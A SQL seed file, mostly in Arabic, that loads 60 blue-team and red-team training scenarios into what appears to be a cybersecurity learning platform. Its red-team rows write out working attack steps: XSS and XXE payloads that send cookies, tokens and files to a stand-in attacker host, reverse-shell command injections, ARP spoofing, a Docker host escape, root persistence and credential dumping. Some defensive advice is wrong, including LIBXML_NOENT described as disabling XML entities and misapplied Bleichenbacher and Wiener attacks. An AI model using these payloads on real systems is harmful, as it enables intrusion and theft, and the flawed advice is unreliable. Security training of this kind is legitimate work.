-- APEX Curated Scenario Pool — 30 Blue + 30 Red
-- World-class scenarios inspired by HackTheBox / PortSwigger / SANS / MITRE ATT&CK
-- Distribution: balanced across 28 modules + extra emphasis on top web/crypto

-- ===========================
-- BLUE TEAM (30 سيناريو دفاعي)
-- ===========================

INSERT INTO public.blue_scenarios (module, difficulty, title, story, task_outline, xp_reward) VALUES

-- 1. xss مبتدئ
('xss', 'مبتدئ', 'سد Stored XSS في حقل تعليقات تطبيق NuraTalk',
 'اكتشف SOC في منصة NuraTalk أن التعليقات تُعرض عبر innerHTML مباشرة، فحقن مهاجم وسم <script> يسرق كوكيز 1,200 جلسة. أنت مكلّف بإصلاح الكود قبل إعادة الفتح.',
 'استبدل innerHTML بـ textContent في حلقة عرض التعليقات، واستخدم DOMPurify.sanitize لأي HTML مسموح به، وتأكّد أن <img onerror=…> لا يُنفَّذ.',
 100),

-- 2. sql-injection متوسط
('sql-injection', 'متوسط', 'تحييد Union-Based SQLi في صفحة منتجات TechBazaar',
 'موقع TechBazaar يكشف product.php?id=15 ويبنيه في SELECT name,price FROM products WHERE id=$id بالـ concatenation. المهاجم نفّذ UNION SELECT username,password FROM users-- واستخرج 80 ألف حساب.',
 'حوّل الاستعلام إلى Prepared Statement، تحقّق أن id عدد صحيح فقط عبر CAST/intval، طبّق Least Privilege على حساب DB (إلغاء SELECT على users)، وأضف WAF يحجب UNION/SELECT.',
 150),

-- 3. csrf متوسط
('csrf', 'متوسط', 'تأمين API REST للتحويلات المالية في PayWave',
 'بنك PayWave يعرض POST /api/transfer يقبل JSON. المهاجم يرسل طلباً مع credentials:include عبر fetch، ولا فحص Origin/Referer ولا token. 14 تحويلاً نُفّذت على عملاء عاديين.',
 'اشترط X-CSRF-Token custom header لا يُرسل cross-origin بدون preflight، تحقّق من Origin بصرامة، حدّد CORS لـ origins محددة، وفعّل SameSite=Strict على كوكي الجلسة.',
 150),

-- 4. ssrf متوسط
('ssrf', 'متوسط', 'صد SSRF يستهدف AWS IMDSv1 في CloudPDF',
 'خدمة CloudPDF لتحويل HTML إلى PDF تقبل URL، فاستغل المهاجم http://169.254.169.254/latest/meta-data/iam/security-credentials/ وسرق IAM keys لـ S3 bucket يحوي 50TB من بيانات العملاء.',
 'حدّث EC2 instance لاستخدام IMDSv2 (PUT+token)، احجب 169.254.169.254 على egress firewall، طبّق URL allowlist، اعتمد IAM roles بأدنى صلاحية ممكنة، وفعّل CloudTrail لمراقبة استخدام المفاتيح.',
 150),

-- 5. idor متوسط
('idor', 'متوسط', 'سد IDOR في تحميل فواتير BillHub',
 'بوابة BillHub تتيح GET /download/invoice/9001 مباشرة. المهاجم brute-forced من 9001 إلى 9999 وحصل على فواتير شركات منافسة بقيمة 4 ملايين دولار.',
 'أضف فحص ملكية: تحقّق أن user_id في الفاتورة يطابق session.user_id قبل التحميل، استبدل الأرقام التسلسلية بـ UUID v4 غير قابل للتخمين، وفعّل audit log على كل تحميل.',
 150),

-- 6. lfi-rfi متوسط
('lfi-rfi', 'متوسط', 'صد LFI عبر Log Poisoning في خادم Apache',
 'تطبيق WebX يستدعي include($_GET[lang]) على ملفات لغات. المهاجم حقن PHP في User-Agent ثم طلب include(/var/log/apache2/access.log) فحصل على RCE كامل كمستخدم www-data.',
 'عطّل allow_url_include، نسّق الـ UA في الـ log لمنع log injection (استبدل < > بـ HTML entities)، استخدم open_basedir وrealpath() وwhitelist للملفات المسموح تضمينها.',
 150),

-- 7. xxe متوسط
('xxe', 'متوسط', 'سد XXE في endpoint SOAP لـ TravelGate',
 'API TravelGate للحجوزات يستقبل XML. المهاجم أضاف <!DOCTYPE t [<!ENTITY xxe SYSTEM file:///etc/passwd>]> وسرّب كلمات سر 3,500 عميل و 28 ألف تذكرة.',
 'عطّل معالجة DTDs في المحلّل عبر LIBXML_NOENT، انقل لـ JSON إن أمكن، وإن كان XML ضرورياً طبّق XSD whitelist لـ schema صارم ومراقبة external entity resolution.',
 150),

-- 8. command-injection متوسط
('command-injection', 'متوسط', 'سد Command Injection في أداة ping لـ NetAdmin',
 'تطبيق NetAdmin يستدعي system("ping -c 4 ".$_GET[host]). المهاجم أرسل 8.8.8.8;cat /etc/shadow وسرّب النظام كاملاً ثم صعّد الصلاحيات عبر cron job.',
 'استبدل system() بـ subprocess.run([ping,-c,4,host]) مع list arguments، تحقّق من host بـ regex IPv4/IPv6، شغّل العملية بـ seccomp/AppArmor، وفعّل logging على execve.',
 150),

-- 9. packet-analysis متوسط
('packet-analysis', 'متوسط', 'كشف قناة DNS Tunneling في شبكة AlphaNet',
 'لاحظت SOC في AlphaNet حركة DNS غير اعتيادية: طلبات TXT طويلة لـ 1200 نطاق يومياً. المهاجم يُسرب بيانات حساسة عبر dnscat2 إلى خادم خارجي.',
 'حلل pcap بـ tshark -Y "dns.txt" مع إحصاء length وentropy، استخرج payload و حلّل كـ dnscat2 channel، اعمل block على نطاقات DGA عبر RPZ، وأضف IDS rule لـ DNS TXT > 200 byte.',
 150),

-- 10. firewall متوسط
('firewall', 'متوسط', 'سد قواعد Firewall مكسورة في DMZ DataHub',
 'اكتشفت مراجعة أن iptables في DataHub تسمح بـ ACCEPT all from 10.0.0.0/8 في INPUT chain. المهاجم الذي اخترق خادماً في DMZ وصل لأنظمة الإنتاج كاملة.',
 'احذف rule العامة، طبّق allowlist من منافذ IP محددة لكل service، افصل DMZ عن Production VLAN، واستخدم nftables مع conntrack بدل iptables legacy، وفعّل logging على DROP.',
 150),

-- 11. scanning متوسط
('scanning', 'متوسط', 'كشف Stealth Scan في IDS SenseGuard',
 'منصة SenseGuard لاحظت 3,200 حزمة SYN متفرقة عبر ساعات من IP واحد. المهاجم ينفّذ idle scan عبر zombie host لتجنّب كشف IP الحقيقي.',
 'فعّل Suricata rule لـ anomalic channel: حزم SYN بدون ACK لاحق + IPID متسلسل، طبّق threshold على SYN rate، أضف honeypot للـ zombie detection، وصدّر التنبيهات إلى SIEM.',
 150),

-- 12. mitm متوسط
('mitm', 'متوسط', 'صد ARP Poisoning على LAN في TechCorp',
 'موظفو TechCorp لاحظوا انقطاعاً متكرراً. التحقيق كشف أن مهاجم ضخ ARP replies مزورة فأصبح man-in-the-middle، يلتقط كلمات السر على HTTP الداخلية.',
 'فعّل Dynamic ARP Inspection على السويتشات، طبّق DHCP Snooping، أرسل تنبيهات ARP flux عبر IDS، علّم الموظفين على HTTPS-Only، واستخدم 802.1X لربط المنافذ.',
 150),

-- 13. dns-poisoning قوي
('dns-poisoning', 'قوي', 'احتواء DNS Cache Poisoning عبر راوتر MikroTik',
 'اكتشف فريق IT أن 8,000 عميل يوجّهون لـ IP مزيف عند زيارة bank.com. التحقيق كشف أن MikroTik router في فرع الشركة أصيب بـ DNS spoofing عبر winbox مكشوف.',
 'حدّث firmware MikroTik وفعّل allow-list لخدمات winbox، غيّر كلمات سر admin، فعّل DNSSEC validation، راقب أي تعديل على /ip dns static، وأعد توجيه traffic البنك من خلال proxy.',
 200),

-- 14. encryption-basics متوسط
('encryption-basics', 'متوسط', 'كسر Vigenere مخصص في تطبيق CipherVault',
 'تطبيق CipherVault يخزن بيانات العملاء بتشفير Vigenere بمفتاح قصير 6 chars ثابت. المحلل الأمني يشك أن البيانات سُرّبت. مطلوب كسر التشفير واستعادة البيانات.',
 'استخدم Kasiski examination لتحديد طول المفتاح (look for repeated sequences في ciphertext)، طبّق Index of Coincidence، حلّل بـ Friedman test، استخرج plaintext باستخدام XOR logic.',
 150),

-- 15. hash-cracking متوسط
('hash-cracking', 'متوسط', 'كسر NTLM hashes من NTDS.dit لـ ActiveDirectory',
 'في اختراق ActiveDirectory، استخرج المهاجم ملف NTDS.dit وقام بتحويله عبر secretsdump.py. 12,000 hash مع salted NTLM.',
 'استخرج hashes من NTDS.dit عبر secretsdump، احفظ في format hashcat -m 1000 (NTLM)، شغّل hashcat -a 3 مع rockyou.txt + rules/best64، ركّز على كلمات السر الشائعة (Summer2024!, P@ssw0rd).',
 150),

-- 16. rsa-aes قوي
('rsa-aes', 'قوي', 'صد Padding Oracle Attack على تطبيق VoteSecure',
 'تطبيق VoteSecure يستخدم AES-CBC لتشفير تصويتات المستخدمين ويكشف خطأ PKCS#7 padding عبر HTTP 400 vs 500. المهاجم فكّ تشفير أي تصويت خلال 30 دقيقة.',
 'تخلّص من رسائل خطأ التشفير (response موحّد)، استخدم AES-GCM بدل CBC، طبّق HMAC على ciphertext (encrypt-then-MAC)، اضبط rate limit على /vote، وراقب أي decrypt attempts مكثّفة.',
 200),

-- 17. steganography متوسط
('steganography', 'متوسط', 'استخراج رسالة LSB مخفية في صورة PNG لـ StegoCorp',
 'موظف سابق في StegoCorp سرب صورة company-logo.png. فريق الأمن يشك أن الصورة تحوي ملف تسريبات عبر تقنية LSB. مطلوب استخراجها.',
 'استخدم stegsolve أو zsteg --all لتحليل bit planes، استخرج البيانات عبر steghide -sf logo.png (password فارغ ثم brute)، حلّل entropy وقارن بصرياً بين planes.',
 150),

-- 18. binary-analysis قوي
('binary-analysis', 'قوي', 'تحليل Ransomware MalwareX و استخراج IoCs',
 'عينة من Ransomware ضربت 3 مستشفيات. مطلوب تفكيك packer واستخراج C2 URLs ومفاتيح التشفير وعناوين wallet للدفع.',
 'ثبّت بيئة تحليل (REMnux/FlareVM)، حلّل بـ PEiD للـ packer detection، فك UPX بـ upx -d، حلّل السلوك في sandbox (Cuckoo/Any.Run)، استخرج strings من .rdata، حدد C2 domains و BTC addresses.',
 200),

-- 19. assembly-cracking قوي
('assembly-cracking', 'قوي', 'كسر License Algorithm في برنامج SecureGuard Pro',
 'برنامج SecureGuard Pro يقبل serial key بطول 25 char. مطلوب فهم الخوارزمية وتوليد مفاتيح صحيحة عبر Reverse Engineering للـ assembly code.',
 'حلّل بـ Ghidra/IDA Pro، حدد function التحقق من الـ serial، اتبع المنطق (XOR، rotations، checksums)، استخرج المعادلة، طوّر keygen بـ Python، تحقّق من جميع branches.',
 200),

-- 20. linux-privesc متوسط
('linux-privesc', 'متوسط', 'تصعيد الصلاحيات عبر SUID /usr/bin/find',
 'في اختبار اختراق، حصلت على shell كمستخدم www-data. اكتشفت أن /usr/bin/find يملك SUID bit، ما يسمح بتنفيذ أوامر root.',
 'استخدم find . -exec /bin/sh -p \; -quit لتصعيد root، بعدها اجمع /etc/shadow، استخرج SSH keys لـ root، واصنع persistence عبر authorized_keys. وثّق الـ path واسم المستخدم.',
 150),

-- 21. windows-privesc متوسط
('windows-privesc', 'متوسط', 'تصعيد الصلاحيات عبر Unquoted Service Path',
 'في خادم Windows، وجدت خدمة "Veeam Backup" تستخدم مساراً غير محصور بعلامات اقتباس: C:\Program Files\Veeam\Backup\Veeam.exe. المسار C:\Program يكتب للجميع.',
 'أنشئ C:\Program.exe أو C:\Program Files\Veeam.exe يعمل كـ reverse shell، أعد تشغيل الخدمة عبر sc stop/start، احصل على SYSTEM. نظّف الـ artifact بعد الانتهاء.',
 150),

-- 22. active-directory قوي
('active-directory', 'قوي', 'كشف Kerberoasting في ActiveDirectory لـ MegaCorp',
 'لاحظت SOC طلبات TGS متكررة وغير اعتيادية لـ SPNs. المهاجم يستخرج tickets service accounts لـ offline cracking عبر hashcat.',
 'مراقبة Event ID 4769 مع Ticket Encryption Type 0x17 (RC4) على Service Accounts، شغّل hashcat -m 13100 على tickets المسرّبة، طبّق Managed Service Accounts مع AES keys، وقلّل طول كلمة السر > 25.',
 200),

-- 23. android-ios متوسط
('android-ios', 'متوسط', 'سد Insecure Data Storage في تطبيق FinanceApp',
 'تطبيق FinanceApp على Android يخزن tokens في SharedPreferences بـ MODE_WORLD_READABLE. تطبيق معاد هندسته استخرج access tokens لـ 50,000 مستخدم.',
 'انقل لـ EncryptedSharedPreferences مع Android Keystore، طبّق SafetyNet/Play Integrity، فعّل FLAG_SECURE، وامسح tokens من الذاكرة بعد الاستخدام، وأعد tokens قصيرة العمر (15 دقيقة).',
 150),

-- 24. cloud-config متوسط
('cloud-config', 'متوسط', 'سد S3 Bucket Public في CloudFlow',
 'اكتشف الباحث الأمني أن bucket s3://cloudflow-prod-data مفتوح للعالم مع بيانات PII لـ 2 مليون عميل. تم الإبلاغ عبر برنامج bug bounty.',
 'فعّل Block Public Access على مستوى account، طبّق bucket policies بـ least privilege، فعّل server-side encryption بـ KMS، شغّل Macie لاكتشاف PII، وفعّل CloudTrail data events.',
 150),

-- 25. log-analysis متوسط
('log-analysis', 'متوسط', 'كشف Webshell في Apache access.log لـ WebHost',
 'اكتشف فريق الأمن أن access.log يحوي طلبات POST لـ /uploads/avatar.php بمدخلات طويلة Base64. المهاجم حقن webshell عبر رفع ملف avatar.',
 'استخرج IPs عبر grep -E "POST.*avatar.php" access.log، حلّل user-agents المكررة، راجع /uploads/ على القرص، أزل الـ webshell، طبّق disable_functions على PHP، وأضف mod_security rule.',
 150),

-- 26. memory-forensics قوي
('memory-forensics', 'قوي', 'استخراج بصمات Mimikatz من Memory Dump',
 'في تحقيق جنائي، تم التقاط memory.dmp من جهاز اخترق. مطلوب استخراج عمليات Mimikatz، كلمات السر المسرّبة، والـ lateral movement traces.',
 'استخدم Volatility 3: pslist للعمليات المشبوهة (mimikatz.exe, sekurlsa.dll)، mimikatz plugin لـ sekurlsa::logonpasswords، malfind لـ injected code، netscan لـ connections، hashdump لـ SAM hashes.',
 200),

-- 27. sql-injection قوي
('sql-injection', 'قوي', 'احتواء Second-Order SQLi في EnergyGrid',
 'بوابة EnergyGrid للفواتير: المهاجم سجّل اسماً يحوي ) DROP TABLE invoices;-- وعند توليد التقرير الشهري نُفِّذ الـ payload، ففُقد 3 ملايين سجل فاتورة وتضرر 800 ألف عميل.',
 'استخدم Prepared Statements عند الإدخال والقراءة، escape output حسب السياق، أضف integrity hash على البيانات الحرجة، فعّل DB firewall يحظر DDL من حساب التطبيق، واعمل daily backup مع PITR.',
 200),

-- 28. xss قوي
('xss', 'قوي', 'صد CSP Bypass عبر JSONP endpoint قديم',
 'تطبيق CloudDocs يفرض CSP script-src self. لكن اكتشف الباحث أن /api/jsonp?callback=foo يسمح بـ eval-like. المهاجم استخدم /api/jsonp?callback=alert;document.location=evil لسرقة الكوكيز.',
 'احذف endpoints JSONP القديمة، فعّل script-src nonces في CSP (ليس just self)، أضف base-uri none، راقب أي violation report، واستخدم Trusted Types.',
 200),

-- 29. mitm قوي
('mitm', 'قوي', 'كشف SSL Strip على WiFi Rogue AP في HotelNet',
 'خلال عملية اختبار، نُشرت شبكة HotelNet-WiFi-FREE وهمية في فندق. المهاجم هبط TLS إلى HTTP لـ 47 نزيل خلال ساعتين. التحقيق يحتاج تحليل pcap كامل.',
 'حلّل pcap بـ tshark -Y http.request، ابحث عن 301 redirect من https:// لـ http://، استخرج domain وcredentials، حدد BSSID للـ rogue AP، أضف HSTS preload و HTTPS-Only mode في Firefox.',
 200),

-- 30. hash-cracking قوي
('hash-cracking', 'قوي', 'كسر Bcrypt مسرّب من تطبيق AuthFlow',
 'في اختراق AuthFlow، سُرّبت قاعدة بيانات بحجم 800K hash bcrypt cost=10. مطلوب تقييم قابلية الكسر ضمن 30 يوم على GPU cluster.',
 'استخرج hashes بصيغة $2b$10$، شغّل hashcat -m 3200 -a 0 مع rockyou.txt ثم merged top 10 wordlists، أضف rules/best64 و dive، وثّق cost analysis و زمن الكسر لكل password class.',
 200);

-- ===========================
-- RED TEAM (30 سيناريو هجومي)
-- ===========================

INSERT INTO public.red_scenarios (module, difficulty, title, story, task_outline, xp_reward) VALUES

-- 1. xss مبتدئ
('xss', 'مبتدئ', 'سرقة Session Cookie عبر Stored XSS في NuraTalk',
 'منصة NuraTalk لا تنقّي مدخلات حقل التعليقات. تستعرض تأثير الـ XSS عبر سرقة كوكيز جلسة أحد المشرفين والوصول لحسابه.',
 'سجّل تعليق يحوي <img src=x onerror=fetch(//attacker/?c=+document.cookie)>، انتظر تسجيل دخول مشرف (في sandbox)، استقبل الكوكيز، سجّل دخول بها.',
 100),

-- 2. sql-injection مبتدئ
('sql-injection', 'مبتدئ', 'تخطي تسجيل دخول ShopMart عبر Authentication Bypass',
 'تطبيق ShopMart يبني SELECT * FROM users WHERE email=$e AND pwd=$p بالـ concatenation. تريد تخطي تسجيل الدخول كأدمن.',
 'أرسل في حقل email: admin@shop.com-- - وفي pwd أي قيمة، أو استخدم OR 1=1-- في email. وثّق الاستعلام الناتج واسم المستخدم الذي دخلت به.',
 100),

-- 3. csrf متوسط
('csrf', 'متوسط', 'تزوير طلب تحويل في PayWave عبر JSON CSRF',
 'PayWave يعرض /api/transfer يقبل JSON ولا يتحقق من Origin. تريد إجراء تحويل 500$ لحسابك من حساب عميل آخر عبر خداعه بزيارة صفحة ضارة.',
 'أنشئ HTML يحوي form بـ enctype=text/plain لإرسال {"to":"attacker","amount":"500"}، يستهدف endpoint /api/transfer مع credentials، قدّم البرهان (screenshot) لطلب POST فعلي.',
 150),

-- 4. ssrf متوسط
('ssrf', 'متوسط', 'استخراج IAM Credentials من CloudPDF عبر IMDSv1',
 'خدمة CloudPDF تقبل URL وتحمّله. الـ EC2 instance تستخدم IMDSv1. تريد سحب مفاتيح IAM credentials لـ S3 bucket يقرأ بيانات حساسة.',
 'أنشئ URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ، أرسلها كـ job، حلّل الـ response لاستخراج AccessKey و SecretKey، ثم aws s3 cp كل البيانات.',
 150),

-- 5. idor مبتدئ
('idor', 'مبتدئ', 'استخراج بيانات مستخدمين من Taskly عبر IDOR',
 'تطبيق Taskly يستخدم /api/users/{id}/profile بدون فحص ملكية. تريد تعداد المستخدمين وسرقة بياناتهم.',
 'سجّل حساب، التقط GET /api/users/1/profile ثم /2/.../50. استخرج email و phone و name. أنشئ user enumeration mapping.',
 100),

-- 6. lfi-rfi مبتدئ
('lfi-rfi', 'مبتدئ', 'قراءة /etc/passwd من DocuLib عبر LFI',
 'موقع DocuLib يستدعي include($_GET[page]). تريد قراءة ملفات النظام الحساسة كمقدمة لـ privilege escalation.',
 'جرّب ?page=../../../../etc/passwd ثم ?page=php://filter/convert.base64-encode/resource=index.php لقراءة source. سجّل ما حصلت عليه.',
 100),

-- 7. xxe متوسط
('xxe', 'متوسط', 'استخراج بيانات Blind XXE OOB في LogIngest',
 'API LogIngest يحلّل XML لكن لا يعرضه. تريد exfiltrate /etc/hostname عبر قناة خارجية (Blind XXE OOB).',
 'أنشئ XML payload مع parameter entity يشير لـ http://your-server.com/?d=file:///etc/hostname، استقبل الطلب في netcat، وثّق leak.',
 150),

-- 8. command-injection متوسط
('command-injection', 'متوسط', 'RCE عبر ImageMagick في ImageProc',
 'تطبيق ImageProc يستخدم exec("convert ".$file." output.png") لرفع الصور. تريد تنفيذ أوامر كـ www-data.',
 'ارفع ملف باسم |id;.png أو $(id).png، راقب الـ output، أنشئ reverse shell عبر mknod + nc أو perl/python one-liner، احصل على shell ثابت.',
 150),

-- 9. packet-analysis متوسط
('packet-analysis', 'متوسط', 'تحديد C2 Beacon لـ Cobalt Strike في pcap',
 'في اختبار اختراق، التقطت 800MB من pcap يشمل حركة beacon. تريد تأكيد وجود C2 وتحديد teamserver IP والـ jitter.',
 'استخدم tshark -Y "tls.handshake.extensions_server_name" لتحديد destinations، حلّل inter-arrival time بـ Wireshark IO graph، استخرج JA3/JA3s fingerprint لـ fingerprinting Cobalt Strike.',
 150),

-- 10. firewall متوسط
('firewall', 'متوسط', 'اكتشاف منفذ مخفي في جدار حماية DataHub',
 'في DataHub، جدار الحماية يحجب SYN الخارجي للمنفذ 22, 80, 443 لكن يظهر أن المهاجم وجد منفذ 8080 مفتوحاً. تريد رسم المنافذ الخفية المتاحة.',
 'استخدم nmap -sS -p 1-65535 --open --min-rate 5000، ركّز على common bypass ports (53, 80, 443, 8080, 8443)، وثّق المنافذ و banner grabbing.',
 150),

-- 11. scanning متوسط
('scanning', 'متوسط', 'SYN Stealth Scan لاكتشاف بصمة SenseGuard',
 'تريد تخطيط بنية SenseGuard بدون تنبيه IDS. تستخدم nmap SYN scan مع توزيع عشوائي للـ timing و source port 53.',
 'nmap -sS -T2 --source-port 53 -D RND:10 --randomize-hosts -p 1-1000 target، وثّق المنافذ والخدمات والـ banner، أضف fragmentation (-f).',
 150),

-- 12. mitm متوسط
('mitm', 'متوسط', 'ARP Spoofing + SSL Strip على TechCorp',
 'تريد اعتراض HTTP traffic من زميل لك في TechCorp. تستخدم arpspoof ثم sslstrip لخفض HTTPS لـ HTTP.',
 'echo 1 > /proc/sys/net/ipv4/ip_forward ثم arpspoof -i eth0 -t victim -r gateway، بعدها sslstrip -l 8080 + iptables redirect، سجّل الـ credentials.',
 150),

-- 13. dns-poisoning متوسط
('dns-poisoning', 'متوسط', 'PoC لـ DNS Cache Poisoning عبر spoofed response',
 'في بيئة اختبار معزولة، تريد إثبات أن DNS resolver محلي قابل لـ cache poisoning عبر ID race condition.',
 'استخدم scapy لإرسال DNS response مزورة بسرعة لـ victim query، حدد source port صحيح و TXID، راقب cache، وثّق كم محاولة تحتاج للنجاح.',
 150),

-- 14. encryption-basics متوسط
('encryption-basics', 'متوسط', 'كسر Vigenere Custom في CipherVault',
 'تطبيق CipherVault يخزن بيانات بـ Vigenere 6-char key. تريد استخراج النص الأصلي باستخدام Kasiski و Index of Coincidence.',
 'اجمع ciphertext كافي (4KB+)، استخدم Kasiski للبحث عن repeats بمسافة 3-12، حدد key length، حلّل frequency لكل موضع، استخرج المفتاح.',
 150),

-- 15. hash-cracking متوسط
('hash-cracking', 'متوسط', 'كسر MD5 hashes مسرّبة من WordPress',
 'كلمات مرور موقع WordPress مسرّبة بصيغة MD5 غير salted. تريد كسر أكبر عدد خلال 6 ساعات.',
 'استخرج hash:email list، شغّل hashcat -m 0 -a 0 hashes.txt rockyou.txt، أضف rules/best64، أوقف بعد الوصول لقمة، وثّق success rate.',
 150),

-- 16. rsa-aes قوي
('rsa-aes', 'قوي', 'Bleichenbacher Padding Oracle على VoteSecure',
 'تطبيق VoteSecure يكشف PKCS#7 padding errors عبر رسائل مختلفة. تريد فك تشفير أي تصويت خلال 30 دقيقة.',
 'حدد الـ oracle (HTTP 400 vs 500)، نفّذ Bleichenbacher attack مع adaptive c = c * s^e mod n، حلّل حزم بيانات، استخرج النص الأصلي بعد ~10000 محاولة.',
 200),

-- 17. steganography متوسط
('steganography', 'متوسط', 'استخراج نص مخفي من audio spectrogram',
 'تسريب صوتي من StegoCorp يحوي spectrogram مشبوه. تريد استخراج الـ flag من النطاقات الترددية العليا.',
 'افتح الملف بـ Audacity أو Sonic Visualiser، انتقل لـ Spectrogram view، ابحث عن أنماط في frequencies >15kHz، اقرأ النص يدوياً أو عبر OCR.',
 150),

-- 18. binary-analysis قوي
('binary-analysis', 'قوي', 'فك UPX packer على MalwareX ransomware',
 'عينة من MalwareX معبأة بـ UPX. تريد استخراج الـ payload الأصلي وتحليل السلوك الضار بدون تشغيل في الـ prod.',
 'حدّد UPX signature بـ strings | grep UPX، استخدم upx -d malware.bin، حلّل بـ Ghidra، حدد decryption routine، شغّل في Cuckoo sandbox مع FakeNet.',
 200),

-- 19. assembly-cracking قوي
('assembly-cracking', 'قوي', 'Patch Binary لتجاوز License Check في SecureGuard',
 'برنامج SecureGuard Pro يتحقق من license محلياً (offline). تريد إنشاء نسخة تعمل بدون key شرعي عبر NOPing jump condition.',
 'افتح بـ Ghidra، حدّد function يتحقق من license_ok flag (cmp + jne)، عدّل في Hex Workshop لجعل jne -> jmp أو NOP، احفظ binary، جرّب.',
 200),

-- 20. linux-privesc متوسط
('linux-privesc', 'متوسط', 'استغلال SUID /usr/bin/bash للحصول على root',
 'في خادم اخترقته، وجدت أن /usr/bin/bash يملك SUID root. تريد تصعيد الصلاحيات.',
 'bash -p (مع SUID bit يحفظ effective UID)، تحقّق من id (uid=0)، اقرأ /etc/shadow و /root/.ssh/id_rsa، اصنع persistence في /etc/cron.d.',
 150),

-- 21. windows-privesc متوسط
('windows-privesc', 'متوسط', 'تصعيد صلاحيات عبر JuicyPotato في Windows Server',
 'في Windows Server 2016، حصلت على session كـ IIS AppPool. تريد SYSTEM عبر DCOM/RPC exploit.',
 'شغّل JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {8BC3F06E-3FAB-4FFE-9F01-E4B8B8CE9A8A}، احصل على SYSTEM shell.',
 150),

-- 22. active-directory قوي
('active-directory', 'قوي', 'Kerberoast SPN account في ActiveDirectory',
 'لديك domain user low-priv في MegaCorp. تريد تصعيد الصلاحيات عبر Kerberoasting على account خدمة SPN.',
 'GetUserSPNs.py -dc-ip <DC> <domain>/<user>:<pass> -request، استخرج ticket، crack عبر hashcat -m 13100، سجّل دخول كـ service account.',
 200),

-- 23. android-ios متوسط
('android-ios', 'متوسط', 'تخطي Certificate Pinning في FinanceApp',
 'تطبيق FinanceApp على Android يفرض SSL pinning، تريد اعتراض traffic الـ API لاستخراج endpoints.',
 'استخدم objection (Frida-based) لاستبدال TrustManager، أو Burp + BurpCert، أو apk-mitm لتعديل APK وإزالة pin، اعترض في BurpSuite.',
 150),

-- 24. cloud-config متوسط
('cloud-config', 'متوسط', 'استغلال Docker API المكشوف على Server-01',
 'منصة Server-01 تشغّل Docker daemon على :2375 بدون TLS. تريد اختراق الـ host والـ containers.',
 'curl http://target:2375/version، بعدها docker -H tcp://target:2375 run -v /:/host -it alpine chroot /host /bin/sh، اعمل lateral movement.',
 150),

-- 25. log-analysis متوسط
('log-analysis', 'متوسط', 'تحديد المهاجم الأولي في access.log لـ WebHost',
 'في اختراق WebHost، تريد تحديد الـ IP الأولي الذي حقن الـ webshell والمدة الزمنية للاختراق.',
 'grep -E "POST.*\\.php" access.log | awk {print $1, $4, $7, $9} | sort -u، حدد الـ IP الأكثر غرابة، استخرج user-agent و time window، وسّع البحث في 30 يوم السابقة.',
 150),

-- 26. memory-forensics قوي
('memory-forensics', 'قوي', 'استخراج LSASS memory dump لكشف كلمات السر',
 'في تحقيق جنائي، حصلت على memory.dmp. تريد استخراج credentials المستخدمين من عملية LSASS.',
 'Volatility 3: pslist --pid 956، ثم mkdir dump و dd of lsass.dmp، بعدها mimikatz::sekurlsa::minidump lsass.dmp، استخرج plaintext و NTLM hashes.',
 200),

-- 27. sql-injection قوي
('sql-injection', 'قوي', 'استخراج كلمات السر عبر Time-Based Blind SQLi في MediCore',
 'API MediCore يعرض 200/404. تريد استخراج admin password حرف بحرف دون تنبيه IDS.',
 'AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97,SLEEP(5),0)، أكتب سكريبت Python يختبر ASCII 32-126 لكل موضع، وثّق وقت التنفيذ.',
 200),

-- 28. xss قوي
('xss', 'قوي', 'DOM XSS عبر location.hash في تطبيق SmartMail',
 'تطبيق SmartMail SPA يقرأ location.hash و يضعه في eval() لتنفيذ route. تريد سرقة localStorage.',
 'payload: #javascript:fetch(//attacker/?+localStorage.token)، اعمل phishing link، المهاجم يفتحه فتنسرّب token JWT.',
 200),

-- 29. command-injection قوي
('command-injection', 'قوي', 'Polyglot command injection لتجاوز جميع الفلاتر',
 'تطبيق ImageProc يطبّق عدة فلاتر (blacklist chars). تريد polyglot يعمل في كل الفلترة ويصعّد لـ root.',
 'جرّب: $(rev${IFS}echo${IFS}PYTHON_REV_SHELL)، أو newline injection: %0aid، أو chained: a];id;[b، أو env variable expansion: ${PATH:0:1}etc${PATH:0:1}passwd.',
 200),

-- 30. rsa-aes متوسط
('rsa-aes', 'متوسط', 'Wiener Attack على RSA Key صغير في CryptoChat',
 'تطبيق CryptoChat يستخدم RSA بمفتاح عام e=3 وصغير n. تريد استعادة المفتاح الخاص وفك تشفير الرسائل.',
 'احصل على n و e من key.pem، شغّل Wieners attack عبر continued fraction expansion على e/n، استخرج d، فك التشفير بـ RSA مع OAEP.',
 150);
